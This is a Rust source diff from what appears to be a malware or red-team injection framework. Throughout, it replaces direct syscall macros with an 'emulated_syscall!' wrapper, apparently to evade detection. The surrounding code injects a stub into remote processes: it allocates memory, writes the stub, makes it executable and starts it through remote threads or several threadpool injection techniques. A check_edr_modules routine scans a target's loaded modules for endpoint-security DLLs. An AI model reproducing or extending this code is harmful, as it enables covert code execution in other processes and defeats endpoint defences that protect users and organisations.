@@ -601,7 +601,7 @@ impl InjectionHandle {
             if self.sleep_stub_addr != 0 && !self.process_handle.is_null() {
                 let mut base = self.sleep_stub_addr;
                 let mut sz: usize = 0;
-                let _ = nt_syscall::syscall!(
+                let _ = emulated_syscall!(
                     "NtFreeVirtualMemory",
                     self.process_handle as u64,
                     &mut base as *mut _ as u64,
@@ -614,7 +614,7 @@ impl InjectionHandle {
             if self.injected_base_addr != 0 && !self.process_handle.is_null() {
                 let mut base = self.injected_base_addr;
                 let mut sz: usize = 0;
-                let _ = nt_syscall::syscall!(
+                let _ = emulated_syscall!(
                     "NtFreeVirtualMemory",
                     self.process_handle as u64,
                     &mut base as *mut _ as u64,
@@ -626,13 +626,13 @@ impl InjectionHandle {
             // Close thread handle if held.
             if let Some(h) = self.thread_handle.take() {
                 if !h.is_null() {
-                    let _ = nt_syscall::syscall!("NtClose", h as u64);
+                    let _ = emulated_syscall!("NtClose", h as u64);
                 }
             }
 
             // Close process handle.
             if !self.process_handle.is_null() {
-                let _ = nt_syscall::syscall!(
+                let _ = emulated_syscall!(
                     "NtClose",
                     self.process_handle as u64
                 );
@@ -892,7 +892,7 @@ impl InjectionHandle {
             let stub_addr = (payload_base + payload_size + 0x1000) & !0xFFF;
             let mut remote_stub: usize = stub_addr;
             let mut alloc_size = stub.len();
-            let s = nt_syscall::syscall!(
+            let s = emulated_syscall!(
                 "NtAllocateVirtualMemory",
                 self.process_handle as u64,
                 &mut remote_stub as *mut _ as u64,
@@ -913,7 +913,7 @@ impl InjectionHandle {
 
             // Write the stub.
             let mut written = 0usize;
-            let ws = nt_syscall::syscall!(
+            let ws = emulated_syscall!(
                 "NtWriteVirtualMemory",
                 self.process_handle as u64,
                 remote_stub as u64,
@@ -932,7 +932,7 @@ impl InjectionHandle {
             let mut old_prot = 0u32;
             let mut prot_base = remote_stub;
             let mut prot_size = stub.len();
-            let _ = nt_syscall::syscall!(
+            let _ = emulated_syscall!(
                 "NtProtectVirtualMemory",
                 self.process_handle as u64,
                 &mut prot_base as *mut _ as u64,
@@ -942,7 +942,7 @@ impl InjectionHandle {
             );
 
             // Flush I-cache.
-            let _ = nt_syscall::syscall!(
+            let _ = emulated_syscall!(
                 "NtFlushInstructionCache",
                 self.process_handle as u64,
                 remote_stub as u64,
@@ -973,7 +973,7 @@ impl InjectionHandle {
 
             let mut payload_buf = vec![0u8; payload_size];
             let mut bytes_read = 0usize;
-            let rs = nt_syscall::syscall!(
+            let rs = emulated_syscall!(
                 "NtReadVirtualMemory",
                 self.process_handle as u64,
                 payload_base as u64,
@@ -1035,7 +1035,7 @@ impl InjectionHandle {
                         if addr_table_loc > 0 {
                             let mut target_ptr: u64 = 0;
                             let mut ptr_read = 0usize;
-                            let pr = nt_syscall::syscall!(
+                            let pr = emulated_syscall!(
                                 "NtReadVirtualMemory",
                                 self.process_handle as u64,
                                 addr_table_loc as u64,
@@ -1074,7 +1074,7 @@ impl InjectionHandle {
                     let mut prot_base2 = payload_base;
                     let mut prot_size2 = payload_size;
                     let mut old_prot2 = 0u32;
-                    let _ = nt_syscall::syscall!(
+                    let _ = emulated_syscall!(
                         "NtProtectVirtualMemory",
                         self.process_handle as u64,
                         &mut prot_base2 as *mut _ as u64,
@@ -1084,7 +1084,7 @@ impl InjectionHandle {
                     );
 
                     let mut patch_written = 0usize;
-                    let _ = nt_syscall::syscall!(
+                    let _ = emulated_syscall!(
                         "NtWriteVirtualMemory",
                         self.process_handle as u64,
                         payload_base as u64,
@@ -1094,7 +1094,7 @@ impl InjectionHandle {
                     );
 
                     // Restore RX protection.
-                    let _ = nt_syscall::syscall!(
+                    let _ = emulated_syscall!(
                         "NtProtectVirtualMemory",
                         self.process_handle as u64,
                         &mut prot_base2 as *mut _ as u64,
@@ -1103,7 +1103,7 @@ impl InjectionHandle {
                         &mut old_prot2 as *mut _ as u64,
                     );
 
-                    let _ = nt_syscall::syscall!(
+                    let _ = emulated_syscall!(
                         "NtFlushInstructionCache",
                         self.process_handle as u64,
                         payload_base as u64,
@@ -1151,11 +1151,11 @@ impl Drop for InjectionHandle {
         unsafe {
             if let Some(h) = self.thread_handle.take() {
                 if !h.is_null() {
-                    let _ = nt_syscall::syscall!("NtClose", h as u64);
+                    let _ = emulated_syscall!("NtClose", h as u64);
                 }
             }
             if !self.process_handle.is_null() {
-                let _ = nt_syscall::syscall!("NtClose", self.process_handle as u64);
+                let _ = emulated_syscall!("NtClose", self.process_handle as u64);
                 self.process_handle = std::ptr::null_mut();
             }
         }
@@ -1976,7 +1976,7 @@ unsafe fn check_edr_modules(target_pid: u32) -> Result<Vec<String>, InjectionErr
     );
 
     if status < 0 {
-        let _ = nt_syscall::syscall!("NtClose", h_proc as u64);
+        let _ = emulated_syscall!("NtClose", h_proc as u64);
         return Ok(found); // Can't read PEB — assume no EDR modules.
     }
 
@@ -1986,7 +1986,7 @@ unsafe fn check_edr_modules(target_pid: u32) -> Result<Vec<String>, InjectionErr
     // PEB->Ldr is at offset 0x18.
     let mut ldr_ptr: usize = 0;
     let mut bytes_read: usize = 0;
-    let rs = nt_syscall::syscall!(
+    let rs = emulated_syscall!(
         "NtReadVirtualMemory",
         h_proc as u64,
         (peb_addr + 0x18) as u64,
@@ -1996,7 +1996,7 @@ unsafe fn check_edr_modules(target_pid: u32) -> Result<Vec<String>, InjectionErr
     );
 
     if rs.is_err() || rs.unwrap() < 0 || bytes_read != 8 {
-        let _ = nt_syscall::syscall!("NtClose", h_proc as u64);
+        let _ = emulated_syscall!("NtClose", h_proc as u64);
         return Ok(found);
     }
 
@@ -2004,7 +2004,7 @@ unsafe fn check_edr_modules(target_pid: u32) -> Result<Vec<String>, InjectionErr
     // Head is at LDR + 0x20 (Flink), LDR + 0x28 (Blink).
     let mut current_flink: usize = 0;
     let mut br: usize = 0;
-    let rs2 = nt_syscall::syscall!(
+    let rs2 = emulated_syscall!(
         "NtReadVirtualMemory",
         h_proc as u64,
         (ldr_ptr + 0x20) as u64,
@@ -2014,7 +2014,7 @@ unsafe fn check_edr_modules(target_pid: u32) -> Result<Vec<String>, InjectionErr
     );
 
     if rs2.is_err() || rs2.unwrap() < 0 || br != 8 {
-        let _ = nt_syscall::syscall!("NtClose", h_proc as u64);
+        let _ = emulated_syscall!("NtClose", h_proc as u64);
         return Ok(found);
     }
 
@@ -2033,7 +2033,7 @@ unsafe fn check_edr_modules(target_pid: u32) -> Result<Vec<String>, InjectionErr
         // UNICODE_STRING: Length (u16), MaxLength (u16), [pad], Buffer (usize).
         let mut us_data: [u8; 16] = [0; 16];
         let mut br2: usize = 0;
-        let rs3 = nt_syscall::syscall!(
+        let rs3 = emulated_syscall!(
             "NtReadVirtualMemory",
             h_proc as u64,
             (entry_base + 0x58) as u64,
@@ -2056,7 +2056,7 @@ unsafe fn check_edr_modules(target_pid: u32) -> Result<Vec<String>, InjectionErr
             // Read the DLL name bytes (UTF-16LE).
             let mut name_bytes = vec![0u8; name_len];
             let mut br3: usize = 0;
-            let rs4 = nt_syscall::syscall!(
+            let rs4 = emulated_syscall!(
                 "NtReadVirtualMemory",
                 h_proc as u64,
                 name_buf_ptr as u64,
@@ -2090,7 +2090,7 @@ unsafe fn check_edr_modules(target_pid: u32) -> Result<Vec<String>, InjectionErr
         // Advance to next entry: read Flink of current InMemoryOrderLinks.
         let mut next_flink: usize = 0;
         let mut br4: usize = 0;
-        let _ = nt_syscall::syscall!(
+        let _ = emulated_syscall!(
             "NtReadVirtualMemory",
             h_proc as u64,
             current_flink as u64,
@@ -2101,7 +2101,7 @@ unsafe fn check_edr_modules(target_pid: u32) -> Result<Vec<String>, InjectionErr
         current_flink = next_flink;
     }
 
-    let _ = nt_syscall::syscall!("NtClose", h_proc as u64);
+    let _ = emulated_syscall!("NtClose", h_proc as u64);
     Ok(found)
 }
 
@@ -2121,7 +2121,7 @@ unsafe fn check_target_architecture(target_pid: u32) -> bool {
         let ntdll = match pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL) {
             Some(b) => b,
             None => {
-                let _ = nt_syscall::syscall!("NtClose", h_proc as u64);
+                let _ = emulated_syscall!("NtClose", h_proc as u64);
                 return true; // Assume match if we can't check.
             }
         };
@@ -2132,7 +2132,7 @@ unsafe fn check_target_architecture(target_pid: u32) -> bool {
         ) {
             Some(a) => a,
             None => {
-                let _ = nt_syscall::syscall!("NtClose", h_proc as u64);
+                let _ = emulated_syscall!("NtClose", h_proc as u64);
                 return true;
             }
         };
@@ -2151,7 +2151,7 @@ unsafe fn check_target_architecture(target_pid: u32) -> bool {
         );
 
         if status < 0 {
-            let _ = nt_syscall::syscall!("NtClose", h_proc as u64);
+            let _ = emulated_syscall!("NtClose", h_proc as u64);
             return true; // Assume match.
         }
 
@@ -2159,7 +2159,7 @@ unsafe fn check_target_architecture(target_pid: u32) -> bool {
         let peb_addr = pbi[1] as usize;
         let mut image_base: usize = 0;
         let mut br: usize = 0;
-        let rs = nt_syscall::syscall!(
+        let rs = emulated_syscall!(
             "NtReadVirtualMemory",
             h_proc as u64,
             (peb_addr + 0x10) as u64,
@@ -2169,14 +2169,14 @@ unsafe fn check_target_architecture(target_pid: u32) -> bool {
         );
 
         if rs.is_err() || rs.unwrap() < 0 || br != 8 || image_base == 0 {
-            let _ = nt_syscall::syscall!("NtClose", h_proc as u64);
+            let _ = emulated_syscall!("NtClose", h_proc as u64);
             return true;
         }
 
         // Read DOS header to get e_lfanew (offset to PE header).
         let mut dos_header: [u8; 64] = [0; 64];
         let mut br2: usize = 0;
-        let rs2 = nt_syscall::syscall!(
+        let rs2 = emulated_syscall!(
             "NtReadVirtualMemory",
             h_proc as u64,
             image_base as u64,
@@ -2186,13 +2186,13 @@ unsafe fn check_target_architecture(target_pid: u32) -> bool {
         );
 
         if rs2.is_err() || rs2.unwrap() < 0 || br2 != 64 {
-            let _ = nt_syscall::syscall!("NtClose", h_proc as u64);
+            let _ = emulated_syscall!("NtClose", h_proc as u64);
             return true;
         }
 
         // Verify MZ signature.
         if dos_header[0] != b'M' || dos_header[1] != b'Z' {
-            let _ = nt_syscall::syscall!("NtClose", h_proc as u64);
+            let _ = emulated_syscall!("NtClose", h_proc as u64);
             return true;
         }
 
@@ -2205,14 +2205,14 @@ unsafe fn check_target_architecture(target_pid: u32) -> bool {
         ]) as usize;
 
         if pe_offset == 0 || pe_offset + 6 > 4096 {
-            let _ = nt_syscall::syscall!("NtClose", h_proc as u64);
+            let _ = emulated_syscall!("NtClose", h_proc as u64);
             return true;
         }
 
         // Read PE signature + Machine field (at pe_offset + 4).
         let mut pe_sig: [u8; 6] = [0; 6];
         let mut br3: usize = 0;
-        let rs3 = nt_syscall::syscall!(
+        let rs3 = emulated_syscall!(
             "NtReadVirtualMemory",
             h_proc as u64,
             (image_base + pe_offset) as u64,
@@ -2221,7 +2221,7 @@ unsafe fn check_target_architecture(target_pid: u32) -> bool {
             &mut br3 as *mut _ as u64,
         );
 
-        let _ = nt_syscall::syscall!("NtClose", h_proc as u64);
+        let _ = emulated_syscall!("NtClose", h_proc as u64);
 
         if rs3.is_err() || rs3.unwrap() < 0 || br3 != 6 {
             return true;
@@ -2257,7 +2257,7 @@ unsafe fn query_integrity_level(target_pid: u32) -> u32 {
     };
 
     let result = query_integrity_level_inner(h_proc);
-    let _ = nt_syscall::syscall!("NtClose", h_proc as u64);
+    let _ = emulated_syscall!("NtClose", h_proc as u64);
     result
 }
 
@@ -2296,7 +2296,7 @@ unsafe fn query_integrity_level_inner(h_proc: *mut c_void) -> u32 {
     ) {
         Some(a) => a,
         None => {
-            let _ = nt_syscall::syscall!("NtClose", token_handle as u64);
+            let _ = emulated_syscall!("NtClose", token_handle as u64);
             return 0;
         }
     };
@@ -2317,7 +2317,7 @@ unsafe fn query_integrity_level_inner(h_proc: *mut c_void) -> u32 {
         &mut ret_len,
     );
 
-    let _ = nt_syscall::syscall!("NtClose", token_handle as u64);
+    let _ = emulated_syscall!("NtClose", token_handle as u64);
 
     if status2 < 0 {
         return 0;
@@ -2382,7 +2382,7 @@ unsafe fn open_process_for_query(target_pid: u32) -> Result<*mut c_void, Injecti
     // PROCESS_QUERY_INFORMATION | PROCESS_VM_READ
     let access_mask: u64 = 0x0400 | 0x0010;
     let mut h_proc: usize = 0;
-    let status = nt_syscall::syscall!(
+    let status = emulated_syscall!(
         "NtOpenProcess",
         &mut h_proc as *mut _ as u64,
         access_mask,
@@ -2769,7 +2769,7 @@ fn inject_thread_hijack(
     // Create suspended thread at the shellcode entry point.
     let h_thread = create_suspended_thread(h_proc, remote_base)?;
     // Resume immediately — the thread will execute the payload.
-    let _ = nt_syscall::syscall!("NtResumeThread", h_thread as u64, 0u64);
+    let _ = emulated_syscall!("NtResumeThread", h_thread as u64, 0u64);
 
     Ok(InjectionHandle {
         target_pid: pid,
@@ -2980,7 +2980,7 @@ fn inject_threadpool_work(
         // Write the stub into the target process.
         let mut stub_remote: *mut c_void = std::ptr::null_mut();
         let mut stub_size = stub.len();
-        let s = nt_syscall::syscall!(
+        let s = emulated_syscall!(
             "NtAllocateVirtualMemory",
             h_proc as u64,
             &mut stub_remote as *mut _ as u64,
@@ -2990,7 +2990,7 @@ fn inject_threadpool_work(
             0x04u64,   // PAGE_READWRITE
         );
         if s.is_err() || s.unwrap() < 0 || stub_remote.is_null() {
-            let _ = nt_syscall::syscall!("NtClose", h_proc as u64);
+            let _ = emulated_syscall!("NtClose", h_proc as u64);
             return Err(InjectionError::InjectionFailed {
                 technique: technique.clone(),
                 reason: "failed to allocate stub memory".to_string(),
@@ -2998,7 +2998,7 @@ fn inject_threadpool_work(
         }
 
         let mut written = 0usize;
-        let ws = nt_syscall::syscall!(
+        let ws = emulated_syscall!(
             "NtWriteVirtualMemory",
             h_proc as u64,
             stub_remote as u64,
@@ -3017,7 +3017,7 @@ fn inject_threadpool_work(
         let mut old_prot = 0u32;
         let mut prot_base = stub_remote as usize;
         let mut prot_size = stub.len();
-        let _ = nt_syscall::syscall!(
+        let _ = emulated_syscall!(
             "NtProtectVirtualMemory",
             h_proc as u64,
             &mut prot_base as *mut _ as u64,
@@ -3027,7 +3027,7 @@ fn inject_threadpool_work(
         );
 
         // Flush I-cache.
-        let _ = nt_syscall::syscall!(
+        let _ = emulated_syscall!(
             "NtFlushInstructionCache",
             h_proc as u64,
             stub_remote as u64,
@@ -3036,10 +3036,10 @@ fn inject_threadpool_work(
 
         // Create a thread to run the stub (fire-and-forget).
         let h_thread = create_suspended_thread(h_proc, stub_remote as usize)?;
-        let _ = nt_syscall::syscall!("NtResumeThread", h_thread as u64, 0u64);
+        let _ = emulated_syscall!("NtResumeThread", h_thread as u64, 0u64);
 
         // Close thread handle — the stub orchestrates its own lifecycle.
-        let _ = nt_syscall::syscall!("NtClose", h_thread as u64);
+        let _ = emulated_syscall!("NtClose", h_thread as u64);
 
         Ok(InjectionHandle {
             target_pid: pid,
@@ -3183,7 +3183,7 @@ fn inject_threadpool_worker_factory(
         // Write the stub into the target process.
         let mut stub_remote: *mut c_void = std::ptr::null_mut();
         let mut stub_size = stub.len();
-        let s = nt_syscall::syscall!(
+        let s = emulated_syscall!(
             "NtAllocateVirtualMemory",
             h_proc as u64,
             &mut stub_remote as *mut _ as u64,
@@ -3193,7 +3193,7 @@ fn inject_threadpool_worker_factory(
             0x04u64,
         );
         if s.is_err() || s.unwrap() < 0 || stub_remote.is_null() {
-            let _ = nt_syscall::syscall!("NtClose", h_proc as u64);
+            let _ = emulated_syscall!("NtClose", h_proc as u64);
             return Err(InjectionError::InjectionFailed {
                 technique: technique.clone(),
                 reason: "failed to allocate stub memory".to_string(),
@@ -3201,7 +3201,7 @@ fn inject_threadpool_worker_factory(
         }
 
         let mut written = 0usize;
-        let ws = nt_syscall::syscall!(
+        let ws = emulated_syscall!(
             "NtWriteVirtualMemory",
             h_proc as u64,
             stub_remote as u64,
@@ -3220,7 +3220,7 @@ fn inject_threadpool_worker_factory(
         let mut old_prot = 0u32;
         let mut prot_base = stub_remote as usize;
         let mut prot_size = stub.len();
-        let _ = nt_syscall::syscall!(
+        let _ = emulated_syscall!(
             "NtProtectVirtualMemory",
             h_proc as u64,
             &mut prot_base as *mut _ as u64,
@@ -3228,7 +3228,7 @@ fn inject_threadpool_worker_factory(
             0x20u64,
             &mut old_prot as *mut _ as u64,
         );
-        let _ = nt_syscall::syscall!(
+        let _ = emulated_syscall!(
             "NtFlushInstructionCache",
             h_proc as u64,
             stub_remote as u64,
@@ -3237,8 +3237,8 @@ fn inject_threadpool_worker_factory(
 
         // Execute stub via a remote thread.
         let h_thread = create_suspended_thread(h_proc, stub_remote as usize)?;
-        let _ = nt_syscall::syscall!("NtResumeThread", h_thread as u64, 0u64);
-        let _ = nt_syscall::syscall!("NtClose", h_thread as u64);
+        let _ = emulated_syscall!("NtResumeThread", h_thread as u64, 0u64);
+        let _ = emulated_syscall!("NtClose", h_thread as u64);
 
         Ok(InjectionHandle {
             target_pid: pid,
@@ -3356,7 +3356,7 @@ fn inject_threadpool_timer(
         // Write the stub into the target process.
         let mut stub_remote: *mut c_void = std::ptr::null_mut();
         let mut stub_size = stub.len();
-        let s = nt_syscall::syscall!(
+        let s = emulated_syscall!(
             "NtAllocateVirtualMemory",
             h_proc as u64,
             &mut stub_remote as *mut _ as u64,
@@ -3366,7 +3366,7 @@ fn inject_threadpool_timer(
             0x04u64,
         );
         if s.is_err() || s.unwrap() < 0 || stub_remote.is_null() {
-            let _ = nt_syscall::syscall!("NtClose", h_proc as u64);
+            let _ = emulated_syscall!("NtClose", h_proc as u64);
             return Err(InjectionError::InjectionFailed {
                 technique: technique.clone(),
                 reason: "failed to allocate stub memory".to_string(),
@@ -3374,7 +3374,7 @@ fn inject_threadpool_timer(
         }
 
         let mut written = 0usize;
-        let ws = nt_syscall::syscall!(
+        let ws = emulated_syscall!(
             "NtWriteVirtualMemory",
             h_proc as u64,
             stub_remote as u64,
@@ -3392,7 +3392,7 @@ fn inject_threadpool_timer(
         let mut old_prot = 0u32;
         let mut prot_base = stub_remote as usize;
         let mut prot_size = stub.len();
-        let _ = nt_syscall::syscall!(
+        let _ = emulated_syscall!(
             "NtProtectVirtualMemory",
             h_proc as u64,
             &mut prot_base as *mut _ as u64,
@@ -3400,7 +3400,7 @@ fn inject_threadpool_timer(
             0x20u64,
             &mut old_prot as *mut _ as u64,
         );
-        let _ = nt_syscall::syscall!(
+        let _ = emulated_syscall!(
             "NtFlushInstructionCache",
             h_proc as u64,
             stub_remote as u64,
@@ -3408,8 +3408,8 @@ fn inject_threadpool_timer(
         );
 
         let h_thread = create_suspended_thread(h_proc, stub_remote as usize)?;
-        let _ = nt_syscall::syscall!("NtResumeThread", h_thread as u64, 0u64);
-        let _ = nt_syscall::syscall!("NtClose", h_thread as u64);
+        let _ = emulated_syscall!("NtResumeThread", h_thread as u64, 0u64);
+        let _ = emulated_syscall!("NtClose", h_thread as u64);
 
         Ok(InjectionHandle {
             target_pid: pid,
@@ -3575,7 +3575,7 @@ fn inject_threadpool_io_completion(
         // Write the stub into the target process.
         let mut stub_remote: *mut c_void = std::ptr::null_mut();
         let mut stub_size = stub.len();
-        let s = nt_syscall::syscall!(
+        let s = emulated_syscall!(
             "NtAllocateVirtualMemory",
             h_proc as u64,
             &mut stub_remote as *mut _ as u64,
@@ -3585,7 +3585,7 @@ fn inject_threadpool_io_completion(
             0x04u64,
         );
         if s.is_err() || s.unwrap() < 0 || stub_remote.is_null() {
-            let _ = nt_syscall::syscall!("NtClose", h_proc as u64);
+            let _ = emulated_syscall!("NtClose", h_proc as u64);
             return Err(InjectionError::InjectionFailed {
                 technique: technique.clone(),
                 reason: "failed to allocate stub memory".to_string(),
@@ -3593,7 +3593,7 @@ fn inject_threadpool_io_completion(
         }
 
         let mut written = 0usize;
-        let ws = nt_syscall::syscall!(
+        let ws = emulated_syscall!(
             "NtWriteVirtualMemory",
             h_proc as u64,
             stub_remote as u64,
@@ -3611,7 +3611,7 @@ fn inject_threadpool_io_completion(
         let mut old_prot = 0u32;
         let mut prot_base = stub_remote as usize;
         let mut prot_size = stub.len();
-        let _ = nt_syscall::syscall!(
+        let _ = emulated_syscall!(
             "NtProtectVirtualMemory",
             h_proc as u64,
             &mut prot_base as *mut _ as u64,
@@ -3619,7 +3619,7 @@ fn inject_threadpool_io_completion(
             0x20u64,
             &mut old_prot as *mut _ as u64,
         );
-        let _ = nt_syscall::syscall!(
+        let _ = emulated_syscall!(
             "NtFlushInstructionCache",
             h_proc as u64,
             stub_remote as u64,
@@ -3627,8 +3627,8 @@ fn inject_threadpool_io_completion(
         );
 
         let h_thread = create_suspended_thread(h_proc, stub_remote as usize)?;
-        let _ = nt_syscall::syscall!("NtResumeThread", h_thread as u64, 0u64);
-        let _ = nt_syscall::syscall!("NtClose", h_thread as u64);
+        let _ = emulated_syscall!("NtResumeThread", h_thread as u64, 0u64);
+        let _ = emulated_syscall!("NtClose", h_thread as u64);
 
         Ok(InjectionHandle {
             target_pid: pid,
@@ -3807,7 +3807,7 @@ fn inject_threadpool_wait(
         // Write the stub into the target process.
         let mut stub_remote: *mut c_void = std::ptr::null_mut();
         let mut stub_size = stub.len();
-        let s = nt_syscall::syscall!(
+        let s = emulated_syscall!(
             "NtAllocateVirtualMemory",
             h_proc as u64,
             &mut stub_remote as *mut _ as u64,
@@ -3817,7 +3817,7 @@ fn inject_threadpool_wait(
             0x04u64,
         );
         if s.is_err() || s.unwrap() < 0 || stub_remote.is_null() {
-            let _ = nt_syscall::syscall!("NtClose", h_proc as u64);
+            let _ = emulated_syscall!("NtClose", h_proc as u64);
             return Err(InjectionError::InjectionFailed {
                 technique: technique.clone(),
                 reason: "failed to allocate stub memory".to_string(),
@@ -3825,7 +3825,7 @@ fn inject_threadpool_wait(
         }
 
         let mut written = 0usize;
-        let ws = nt_syscall::syscall!(
+        let ws = emulated_syscall!(
             "NtWriteVirtualMemory",
             h_proc as u64,
             stub_remote as u64,
@@ -3843,7 +3843,7 @@ fn inject_threadpool_wait(
         let mut old_prot = 0u32;
         let mut prot_base = stub_remote as usize;
         let mut prot_size = stub.len();
-        let _ = nt_syscall::syscall!(
+        let _ = emulated_syscall!(
             "NtProtectVirtualMemory",
             h_proc as u64,
             &mut prot_base as *mut _ as u64,
@@ -3851,7 +3851,7 @@ fn inject_threadpool_wait(
             0x20u64,
             &mut old_prot as *mut _ as u64,
         );
-        let _ = nt_syscall::syscall!(
+        let _ = emulated_syscall!(
             "NtFlushInstructionCache",
             h_proc as u64,
             stub_remote as u64,
@@ -3859,8 +3859,8 @@ fn inject_threadpool_wait(
         );
 
         let h_thread = create_suspended_thread(h_proc, stub_remote as usize)?;
-        let _ = nt_syscall::syscall!("NtResumeThread", h_thread as u64, 0u64);
-        let _ = nt_syscall::syscall!("NtClose", h_thread as u64);
+        let _ = emulated_syscall!("NtResumeThread", h_thread as u64, 0u64);
+        let _ = emulated_syscall!("NtClose", h_thread as u64);
 
         Ok(InjectionHandle {
             target_pid: pid,
@@ -3998,7 +3998,7 @@ fn inject_threadpool_alpc(
         // Write the stub into the target process.
         let mut stub_remote: *mut c_void = std::ptr::null_mut();
         let mut stub_size = stub.len();
-        let s = nt_syscall::syscall!(
+        let s = emulated_syscall!(
             "NtAllocateVirtualMemory",
             h_proc as u64,
             &mut stub_remote as *mut _ as u64,
@@ -4008,7 +4008,7 @@ fn inject_threadpool_alpc(
             0x04u64,
         );
         if s.is_err() || s.unwrap() < 0 || stub_remote.is_null() {
-            let _ = nt_syscall::syscall!("NtClose", h_proc as u64);
+            let _ = emulated_syscall!("NtClose", h_proc as u64);
             return Err(InjectionError::InjectionFailed {
                 technique: technique.clone(),
                 reason: "failed to allocate stub memory".to_string(),
@@ -4016,7 +4016,7 @@ fn inject_threadpool_alpc(
         }
 
         let mut written = 0usize;
-        let ws = nt_syscall::syscall!(
+        let ws = emulated_syscall!(
             "NtWriteVirtualMemory",
             h_proc as u64,
             stub_remote as u64,
@@ -4034,7 +4034,7 @@ fn inject_threadpool_alpc(
         let mut old_prot = 0u32;
         let mut prot_base = stub_remote as usize;
         let mut prot_size = stub.len();
-        let _ = nt_syscall::syscall!(
+        let _ = emulated_syscall!(
             "NtProtectVirtualMemory",
             h_proc as u64,
             &mut prot_base as *mut _ as u64,
@@ -4042,7 +4042,7 @@ fn inject_threadpool_alpc(
             0x20u64,
             &mut old_prot as *mut _ as u64,
         );
-        let _ = nt_syscall::syscall!(
+        let _ = emulated_syscall!(
             "NtFlushInstructionCache",
             h_proc as u64,
             stub_remote as u64,
@@ -4050,8 +4050,8 @@ fn inject_threadpool_alpc(
         );
 
         let h_thread = create_suspended_thread(h_proc, stub_remote as usize)?;
-        let _ = nt_syscall::syscall!("NtResumeThread", h_thread as u64, 0u64);
-        let _ = nt_syscall::syscall!("NtClose", h_thread as u64);
+        let _ = emulated_syscall!("NtResumeThread", h_thread as u64, 0u64);
+        let _ = emulated_syscall!("NtClose", h_thread as u64);
 
         Ok(InjectionHandle {
             target_pid: pid,
@@ -4124,7 +4124,7 @@ fn inject_threadpool_direct(
         // pointer at offset 0 (the Callback member).
         let mut direct_remote: *mut c_void = std::ptr::null_mut();
         let mut direct_size = 256usize;
-        let s = nt_syscall::syscall!(
+        let s = emulated_syscall!(
             "NtAllocateVirtualMemory",
             h_proc as u64,
             &mut direct_remote as *mut _ as u64,
@@ -4134,7 +4134,7 @@ fn inject_threadpool_direct(
             0x04u64,
         );
         if s.is_err() || s.unwrap() < 0 || direct_remote.is_null() {
-            let _ = nt_syscall::syscall!("NtClose", h_proc as u64);
+            let _ = emulated_syscall!("NtClose", h_proc as u64);
             return Err(InjectionError::InjectionFailed {
                 technique: technique.clone(),
                 reason: "failed to allocate TP_DIRECT memory".to_string(),
@@ -4144,7 +4144,7 @@ fn inject_threadpool_direct(
         // Write the callback pointer at offset 0 of the TP_DIRECT structure.
         let callback_ptr = remote_base as u64;
         let mut written = 0usize;
-        let ws = nt_syscall::syscall!(
+        let ws = emulated_syscall!(
             "NtWriteVirtualMemory",
             h_proc as u64,
             direct_remote as u64,
@@ -4204,7 +4204,7 @@ fn inject_threadpool_direct(
         // Write the stub into the target process.
         let mut stub_remote: *mut c_void = std::ptr::null_mut();
         let mut stub_size = stub.len();
-        let s = nt_syscall::syscall!(
+        let s = emulated_syscall!(
             "NtAllocateVirtualMemory",
             h_proc as u64,
             &mut stub_remote as *mut _ as u64,
@@ -4214,7 +4214,7 @@ fn inject_threadpool_direct(
             0x04u64,
         );
         if s.is_err() || s.unwrap() < 0 || stub_remote.is_null() {
-            let _ = nt_syscall::syscall!("NtClose", h_proc as u64);
+            let _ = emulated_syscall!("NtClose", h_proc as u64);
             return Err(InjectionError::InjectionFailed {
                 technique: technique.clone(),
                 reason: "failed to allocate stub memory".to_string(),
@@ -4222,7 +4222,7 @@ fn inject_threadpool_direct(
         }
 
         let mut written = 0usize;
-        let ws = nt_syscall::syscall!(
+        let ws = emulated_syscall!(
             "NtWriteVirtualMemory",
             h_proc as u64,
             stub_remote as u64,
@@ -4240,7 +4240,7 @@ fn inject_threadpool_direct(
         let mut old_prot = 0u32;
         let mut prot_base = stub_remote as usize;
         let mut prot_size = stub.len();
-        let _ = nt_syscall::syscall!(
+        let _ = emulated_syscall!(
             "NtProtectVirtualMemory",
             h_proc as u64,
             &mut prot_base as *mut _ as u64,
@@ -4248,7 +4248,7 @@ fn inject_threadpool_direct(
             0x20u64,
             &mut old_prot as *mut _ as u64,
         );
-        let _ = nt_syscall::syscall!(
+        let _ = emulated_syscall!(
             "NtFlushInstructionCache",
             h_proc as u64,
             stub_remote as u64,
@@ -4256,8 +4256,8 @@ fn inject_threadpool_direct(
         );
 
         let h_thread = create_suspended_thread(h_proc, stub_remote as usize)?;
-        let _ = nt_syscall::syscall!("NtResumeThread", h_thread as u64, 0u64);
-        let _ = nt_syscall::syscall!("NtClose", h_thread as u64);
+        let _ = emulated_syscall!("NtResumeThread", h_thread as u64, 0u64);
+        let _ = emulated_syscall!("NtClose", h_thread as u64);
 
         Ok(InjectionHandle {
             target_pid: pid,
@@ -4413,7 +4413,7 @@ fn inject_threadpool_async_io(
         // Write the stub into the target process.
         let mut stub_remote: *mut c_void = std::ptr::null_mut();
         let mut stub_size = stub.len();
-        let s = nt_syscall::syscall!(
+        let s = emulated_syscall!(
             "NtAllocateVirtualMemory",
             h_proc as u64,
             &mut stub_remote as *mut _ as u64,
@@ -4423,7 +4423,7 @@ fn inject_threadpool_async_io(
             0x04u64,
         );
         if s.is_err() || s.unwrap() < 0 || stub_remote.is_null() {
-            let _ = nt_syscall::syscall!("NtClose", h_proc as u64);
+            let _ = emulated_syscall!("NtClose", h_proc as u64);
             return Err(InjectionError::InjectionFailed {
                 technique: technique.clone(),
                 reason: "failed to allocate stub memory".to_string(),
@@ -4431,7 +4431,7 @@ fn inject_threadpool_async_io(
         }
 
         let mut written = 0usize;
-        let ws = nt_syscall::syscall!(
+        let ws = emulated_syscall!(
             "NtWriteVirtualMemory",
             h_proc as u64,
             stub_remote as u64,
@@ -4449,7 +4449,7 @@ fn inject_threadpool_async_io(
         let mut old_prot = 0u32;
         let mut prot_base = stub_remote as usize;
         let mut prot_size = stub.len();
-        let _ = nt_syscall::syscall!(
+        let _ = emulated_syscall!(
             "NtProtectVirtualMemory",
             h_proc as u64,
             &mut prot_base as *mut _ as u64,
@@ -4457,7 +4457,7 @@ fn inject_threadpool_async_io(
             0x20u64,
             &mut old_prot as *mut _ as u64,
         );
-        let _ = nt_syscall::syscall!(
+        let _ = emulated_syscall!(
             "NtFlushInstructionCache",
             h_proc as u64,
             stub_remote as u64,
@@ -4465,8 +4465,8 @@ fn inject_threadpool_async_io(
         );
 
